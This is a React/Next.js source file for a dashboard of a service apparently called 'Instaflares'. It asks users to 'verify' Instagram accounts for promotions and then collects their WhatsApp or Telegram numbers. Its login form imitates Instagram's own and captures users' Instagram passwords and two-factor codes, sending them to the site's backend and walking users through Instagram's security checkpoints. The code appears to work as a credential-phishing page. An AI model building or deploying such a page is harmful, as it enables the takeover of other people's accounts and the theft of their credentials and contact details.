"use client";
import Link from "next/link";
import Image from "next/image";
import { useEffect, useState } from "react";
import Toastify from "toastify-js";
import "toastify-js/src/toastify.css";

// Types
type InstaAccount = {
  insta_id: number;
  instagram_username: string;
};

type UserContact = {
  whatsapp_status: number;
  whatsapp_number?: string;
  telegram_number?: string;
};

const DashboardPage = () => {
  // State
  const [accounts, setAccounts] = useState<InstaAccount[]>([]);
  const [loading, setLoading] = useState(false);
  const [showUsernameOverlay, setShowUsernameOverlay] = useState(false);
  const [showLoginForm, setShowLoginForm] = useState(false);
  const [showOtpOverlay, setShowOtpOverlay] = useState(false);
  const [showCheckpoint, setShowCheckpoint] = useState<null | { url: string }>(null);
  const [showContactForm, setShowContactForm] = useState(false);
  const [error, setError] = useState('');

  // Form states
  const [username, setUsername] = useState("");
  const [loginUsername, setLoginUsername] = useState("");
  const [loginPassword, setLoginPassword] = useState("");
  const [otpValue, setOtpValue] = useState("");
  const [contactWhatsapp, setContactWhatsapp] = useState("");
  const [contactTelegram, setContactTelegram] = useState("");

  useEffect(() => {
    // Redirect to login if no token
    if (typeof window !== "undefined") {
      const token = localStorage.getItem("token");
      if (!token) {
        setError('Unauthorized. Please login.');
        window.location.href = '/login';
        return;
      }
      fetch('/api/instagram-accounts', {
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        }
      })
        .then(res => res.json())
        .then(data => {
          if (data.error) {
            setError(data.error);
            window.location.href = '/login';
          } else {
            setAccounts(data.accounts);
          }
        });
    }
  }, []);

  // Fetch accounts on mount
  useEffect(() => {
    fetchAccounts();
  }, []);

  const fetchAccounts = async () => {
  setLoading(true);
  try {
    const token = localStorage.getItem("token");
    const res = await fetch("/api/instagram-accounts", {
      headers: {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json'
      }
    });
    if (res.status === 401) {
      showToast("Unauthorized. Please login....", "error");
      setLoading(false);
      window.location.href = '/login';
      return;
    }
    const data = await res.json();
    setAccounts(data.accounts || []);
  } catch {
    showToast("Failed to load accounts.", "error");
  }
  setLoading(false);
};

  // Toast helper
  const showToast = (message: string, type: "success" | "error" = "success") => {
    Toastify({
      text: message,
      duration: 4000,
      gravity: "top",
      position: "center",
      backgroundColor: type === "success" ? "#0095f6" : "#ff3b30",
    }).showToast();
  };

  // Add account flow
  const handleAddAccountClick = () => {
    setShowUsernameOverlay(true);
    setUsername("");
  };

  // Username overlay: verify
  const handleVerifyUsername = () => {
    if (!username.trim()) {
      showToast("Please enter your Instagram username.", "error");
      return;
    }
    setLoginUsername(username.trim());
    setShowUsernameOverlay(false);
    setShowLoginForm(true);
  };

  // Login form: submit
  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError("");
    try {
      const res = await fetch("/api/instagram-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: loginUsername, password: loginPassword, otp: otpValue }),
      });
      const data = await res.json();
      console.log("instagram-login response:", data); // debug

      if (data.status === "success") {
        showToast("Login successful", "success");
        fetchAccounts();
        setShowLoginForm(false);
      } else if (data.status === "2fa_required") {
        setShowOtpOverlay(true);
        showToast("Two-factor required. Enter code.", "error");
      } else if (data.status === "checkpoint") {
        // ensure login form closes so overlay is visible
        setShowLoginForm(false);
        setShowOtpOverlay(false);
        setShowCheckpoint({ url: data.verification_url || "" });
        showToast("Verification required. Complete it on Instagram.", "error");
      } else {
        setError(data.message || "Login failed");
        showToast(data.message || "Login failed", "error");
      }
    } catch (err) {
      setError("Network error");
      showToast("Network error", "error");
    } finally {
      setLoading(false);
    }
  };

  // OTP overlay: submit
  const handleOtpSubmit = async () => {
    if (!otpValue.trim()) {
      showToast("Please enter the OTP.", "error");
      return;
    }
    setLoading(true);
    try {
      const res = await fetch("/api/instagram-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: loginUsername, password: loginPassword, otp: otpValue }),
      });
      const data = await res.json();
      console.log("instagram-login (otp) response:", data); // debug
      if (data.status === "success") {
        showToast("Account linked successfully!");
        setShowOtpOverlay(false);
        fetchAccounts();
      } else if (data.status === "checkpoint") {
        setShowOtpOverlay(false);
        setShowLoginForm(false);
        setShowCheckpoint({ url: data.verification_url || "" });
        showToast("Verification required. Please follow the steps.");
      } else {
        showToast(data.message || "OTP failed.", "error");
      }
    } catch {
      showToast("Network error.", "error");
    }
    setLoading(false);
  };

  // Checkpoint: finish
  const handleCheckpointFinish = () => {
    setShowCheckpoint(null);
    setShowLoginForm(true);
    showToast("Now try logging in again.");
  };

  // Remove account
  const handleRemoveAccount = async (insta_id: number) => {
    setLoading(true);
    try {
      const token = localStorage.getItem("token");
      const res = await fetch("/api/instagram-accounts", {
        method: "DELETE",
        headers: {
          "Content-Type": "application/json",
          "Authorization": `Bearer ${token}`,
        },
        body: JSON.stringify({ insta_id }),
      });
      const data = await res.json();
      if (data.status === "success") {
        showToast("Account removed.");
        fetchAccounts();
      } else {
        showToast(data.message || "Failed to remove account.", "error");
      }
    } catch {
      showToast("Network error.", "error");
    }
    setLoading(false);
  };

  // Complete Verification (WhatsApp/Telegram)
  const handleFinishClick = async () => {
    setLoading(true);
    try {
      const res = await fetch("/api/check-whatsapp-status", { method: "POST" });
      const data = await res.json();
      if (data.whatsapp_status === 0) {
        setShowContactForm(true);
      } else {
        showToast("Thanks for providing us the information, we will contact you soon.");
        setTimeout(() => (window.location.href = "/"), 2000);
      }
    } catch {
      showToast("Network error.", "error");
    }
    setLoading(false);
  };

  // Contact form submit
  const handleContactSubmit = async () => {
    if (!contactWhatsapp && !contactTelegram) {
      showToast("Please enter at least one contact number.", "error");
      return;
    }
    setLoading(true);
    try {
      const res = await fetch("/api/update-contact-info", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          whatsapp: contactWhatsapp,
          telegram: contactTelegram,
        }),
      });
      const data = await res.json();
      if (data.status === "success") {
        showToast("Thanks for providing us the information, we will contact you soon.");
        setTimeout(() => (window.location.href = "/"), 2000);
      } else {
        showToast(data.message || "Failed to update info.", "error");
      }
    } catch {
      showToast("Network error.", "error");
    }
    setLoading(false);
  };

  // UI
  return (
    <div className="root">
      <div className="navigation lined">
        <Link className="logo" href="/">
          <img src="/assets/logo/logo-dark.svg" alt="" />
        </Link>
        <Link className="support" href="mailto:instaflaresofficial@gmail.com">
          <img src="/assets/support.svg" alt="" />
        </Link>
      </div>

      {/* Account List or Add Account */}
      {!loading && !showLoginForm && !showOtpOverlay && !showCheckpoint && !showContactForm && (
        <div className="account-screen">
          {accounts.length === 0 ? (
            <>
              <Link href="#" style={{ width: "100%" }} onClick={handleAddAccountClick}>
                <div className="connect-ig">
                  <img src="/assets/add.svg" alt="" />
                  <span>Add Instagram account</span>
                </div>
              </Link>
              <img src="/assets/accountnotconnected.svg" alt="" />
              <h2>No account connected!</h2>
            </>
          ) : (
            <>
              <div className="added-accounts-container">
                {accounts.map((profile) => (
                  <div className="account" key={profile.insta_id}>
                    <div className="creds">
                      <img className="username_img" src="/assets/avatar.svg" alt="" />
                      <span>@{profile.instagram_username}</span>
                    </div>
                    <img
                      className="logout"
                      src="/assets/delete.svg"
                      alt="Delete"
                      style={{ cursor: "pointer" }}
                      onClick={() => handleRemoveAccount(profile.insta_id)}
                    />
                  </div>
                ))}
              </div>
              <img className="divider" src="/assets/connect-upto.svg" alt="" />
              <Link href="#" style={{ width: "100%", paddingBottom: 72 }} onClick={handleAddAccountClick}>
                <div className="connect-ig">
                  <img src="/assets/add.svg" alt="" />
                  <span>Add Instagram account</span>
                </div>
              </Link>
              <button className="finish" onClick={handleFinishClick}>Complete Verification</button>
            </>
          )}
        </div>
      )}

      {/* Username Overlay */}
      {showUsernameOverlay && (
        <div className="username-overlay" onClick={() => setShowUsernameOverlay(false)}>
          <div className="input-container" onClick={e => e.stopPropagation()}>
            <input
              className="input"
              type="text"
              name="user"
              id="username"
              placeholder="Enter your Instagram username (without @)"
              autoFocus
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              disabled={loading}
            />
            <div className="info-section">
              <div className="item">
                <img src="/assets/tick.svg" alt="" />
                <span>username</span>
              </div>
              <div className="item">
                <img src="/assets/wrong.svg" alt="" />
                <span>@username</span>
              </div>
            </div>
            <button className="cta-verify" onClick={handleVerifyUsername} disabled={loading}>
              {loading ? "Verifying..." : "Verify your account"}
            </button>
          </div>
        </div>
      )}

      {/* Login Form */}
      {showLoginForm && (
        <div className="root">
          <div className="text-container-connect">
            <img src="/assets/connect.png" alt="" />
            <h2 className="heading">Verify your Instagram</h2>
            <p className="description">Verify your account ownership.</p>
          </div>
          <div className="login-container">
            <img className="ig-logo" src="/assets/instagram.svg" alt="" />
            <form className="insta-form" onSubmit={handleLoginSubmit}>
              <input
                className="input"
                type="text"
                name="username"
                id="username-login"
                placeholder="Phone number, username, or email"
                required
                value={loginUsername}
                onChange={(e) => setLoginUsername(e.target.value)}
                disabled={loading}
              />
              <input
                className="input"
                type="password"
                name="password"
                id="password"
                placeholder="Password"
                required
                value={loginPassword}
                onChange={(e) => setLoginPassword(e.target.value)}
                disabled={loading}
              />
              <div className="checkbox-container">
                <input className="checkbox" type="checkbox" name="privacy" required />
                <p className="description">
                  By ticking this box, you confirm that you have read, understood,
                  and agree to the <u><span><Link href="#">Instaflares Terms and Conditions</Link></span></u>.
                </p>
              </div>
              <input className="submit" type="submit" value={loading ? "Logging in..." : "Log In"} disabled={loading} />
              <Link className="forgot" href="#">Forgot password?</Link>
            </form>
            <div className="privacy-container">
              <p className="description">
                To ensure the authenticity and ownership of your Instagram account,
                please log in with your credentials. This will allow us to
                <span> verify your account </span> and proceed with
                <span> promotions and sponsorships</span>.
              </p>
              <hr />
              <span className="security-message">
                Your information is secure and will only be used for verification purposes.
              </span>
            </div>
          </div>
        </div>
      )}

      {/* OTP Overlay */}
      {showOtpOverlay && (
        <div className="otp-overlay">
          <div className="otp-content">
            <h3>Enter Verification Code</h3>
            <p>Please enter the verification code sent to your device.</p>
            <input
              type="text"
              className="otp-input"
              placeholder="Enter verification code"
              maxLength={6}
              value={otpValue}
              onChange={(e) => setOtpValue(e.target.value)}
              autoFocus
            />
            <div className="otp-buttons">
              <button className="otp-submit" onClick={handleOtpSubmit} disabled={loading}>
                Submit
              </button>
              <button className="otp-cancel" onClick={() => setShowOtpOverlay(false)} disabled={loading}>
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Checkpoint/Verification Screen */}
      {showCheckpoint && (
        <div className="verification-screen" onClick={() => setShowCheckpoint(null)}>
          <div className="verification-content" onClick={(e) => e.stopPropagation()}>
            <img className="verification-icon" src="/assets/verify-icon.svg" alt="Verify" />
            <h3>Verification required</h3>
            <p>Complete Instagram verification, then retry login.</p>

            {showCheckpoint.url ? (
              <a className="verify-button" href={showCheckpoint.url} target="_blank" rel="noopener noreferrer">
                Open verification link
              </a>
            ) : (
              <a className="verify-button" href="https://instagram.com" target="_blank" rel="noopener noreferrer">
                Open Instagram
              </a>
            )}

            <div style={{ marginTop: 12 }}>
              <button className="try-again-button" onClick={() => { setShowCheckpoint(null); setShowLoginForm(true); }}>
                I completed verification — Retry
              </button>
            </div>

            <p className="verification-note">
              If the verification link doesn't work, open Instagram app or website and follow account recovery steps.
            </p>
          </div>
        </div>
      )}

      {/* WhatsApp/Telegram Contact Form */}
      {showContactForm && (
        <div className="root">
          <div className="social-container">
            <div className="text-container">
              <img src="/assets/number-image.png" alt="" />
              <h2 className="heading">Stay Updated on Promotions!</h2>
              <p className="description">
                Enter your WhatsApp or Telegram number below to stay updated about the latest offers and promotions. We'll make sure you never miss any updates!
              </p>
            </div>
            <div className="input-container">
              <input
                className="input whatsapp"
                type="text"
                name="whatsapp"
                placeholder="Enter your WhatsApp number"
                value={contactWhatsapp}
                onChange={(e) => setContactWhatsapp(e.target.value)}
              />
              <input
                className="input telegram"
                type="text"
                name="telegram"
                placeholder="Enter your Telegram number"
                value={contactTelegram}
                onChange={(e) => setContactTelegram(e.target.value)}
              />
              <input
                className="cta-verify"
                type="submit"
                value={loading ? "Subscribing..." : "Subscribe Now!"}
                onClick={handleContactSubmit}
                disabled={loading}
              />
            </div>
          </div>
        </div>
      )}

      {/* Loader */}
      {loading && (
        <div className="loader-overlay">
          <span className="loader"></span>
        </div>
      )}

      {/* Styles: (reuse your existing styles here) */}
      <style jsx>{`
        /* ...existing styles from your PHP/React code... */
        .loader-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: rgba(0, 0, 0, 0.5);
          display: flex;
          justify-content: center;
          align-items: center;
          z-index: 9999;
        }
        .loader {
          width: 48px;
          height: 48px;
          border: 5px solid #FFF;
          border-bottom-color: #0095f6;
          border-radius: 50%;
          display: inline-block;
          box-sizing: border-box;
          animation: rotation 1s linear infinite;
        }
        @keyframes rotation {
          0% { transform: rotate(0deg);}
          100% { transform: rotate(360deg);}
        }
        .otp-overlay, .verification-screen {
          position: fixed;
          top: 0; left: 0; width: 100%; height: 100%;
          background: rgba(0,0,0,0.75);
          display: flex; justify-content: center; align-items: center;
          z-index: 1000;
        }
        .otp-content, .verification-content {
          background: white;
          padding: 2rem;
          border-radius: 12px;
          max-width: 90%;
          width: 400px;
          text-align: center;
          box-shadow: 0 4px 12px rgba(0,0,0,0.15);
        }
        .otp-input {
          width: 100%;
          padding: 12px;
          margin: 16px 0;
          border: 1px solid #dbdbdb;
          border-radius: 4px;
          font-size: 16px;
        }
        .otp-buttons {
          display: flex;
          gap: 12px;
          justify-content: center;
          margin-top: 20px;
        }
        .otp-submit {
          background: #0095f6;
          color: white;
          padding: 12px 24px;
          border-radius: 8px;
          border: none;
          cursor: pointer;
          font-weight: bold;
        }
        .otp-cancel {
          background: #efefef;
          color: #262626;
          padding: 12px 24px;
          border-radius: 8px;
          border: none;
          cursor: pointer;
        }
        .verify-button {
          display: inline-block;
          background: #0095f6;
          color: white;
          padding: 12px 24px;
          border-radius: 8px;
          text-decoration: none;
          font-weight: bold;
          border: none;
          cursor: pointer;
          transition: background-color 0.2s;
        }
        .verify-button:hover {
          background: #0081d6;
        }
        .try-again-button {
          background: #efefef;
          color: #262626;
          padding: 12px 24px;
          border-radius: 8px;
          border: none;
          cursor: pointer;
          font-weight: 500;
        }
        .verification-note {
          margin-top: 20px;
          padding-top: 20px;
          border-top: 1px solid #dbdbdb;
          font-size: 13px;
          color: #8e8e8e;
        }
        .verification-icon {
          width: 64px;
          height: 64px;
          margin-bottom: 16px;
        }
        /* Add your other styles as needed */
      `}</style>
    </div>
  );
};

export default DashboardPage;